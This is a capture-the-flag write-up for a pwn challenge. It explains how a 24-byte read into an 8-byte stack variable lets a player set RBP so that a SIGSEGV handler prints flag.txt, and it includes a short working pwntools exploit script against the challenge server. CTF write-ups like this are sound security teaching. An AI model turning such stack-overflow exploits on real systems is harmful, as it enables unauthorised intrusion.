# pwn-1: the truth

<img src="images/pwn-1.jpg"></img>

## Prompt 

The **Ministry of Truth** will help you accept the **truth**. Never settle for the **false** teachings of the Brotherhood. The **Ministry of Truth** provides you the attached linux binary to exploit the **truth**. The binary is also running on a remote server where it protects the truth in a file called flag.txt. Capture the flag from the remote server.  Big brother grants you the following code to connect to the remote server.

```python
from pwn import * 
p=remote("bigbrother-pwn-1.chals.io", 443, ssl=True, sni="bigbrother-pwn-1.chals.io")
p.interactive()
```


## Solution

The challenge provides the [source code](src/chal.c). Notably, it registers a signal handler for ``SIGSEGV`` (segmentation faults). It also ``reads()`` 24 bytes into an 8-byte variable, overflowing the stack and corrupting the execution flow. We see that when ``*rbp_value == 0x4E4E4E4E4E4E4E4E``, the program will print the flag. We can influence the RBP register by overflowing the stack. To set RBP to 0x4E4E4E4E4E4E4E4E, we will send input of b'N'*24 (aka b'\x4E'*24.)

```c
void sigsegv_handler(int signal)
{
    uint64_t *rbp_value = 0;
    __asm__("mov %%rbp, %0;"
            : "=r"(rbp_value));
    if (*rbp_value == 0x4E4E4E4E4E4E4E4E)
    {
        system("cat flag.txt");
    }
    else
    {
        slow_printf("<<< You are mad\n");
    }
    exit(0);
}
````
We can automate this with a [pwntools](https://docs.pwntools.com/en/stable/) script. 

```python
from pwn import *

p=remote("bigbrother-pwn-1.chals.io", 443, ssl=True, sni="bigbrother-pwn-1.chals.io")
p.sendlineafter(b' >>>', b'N'*24)
p.interactive()

```
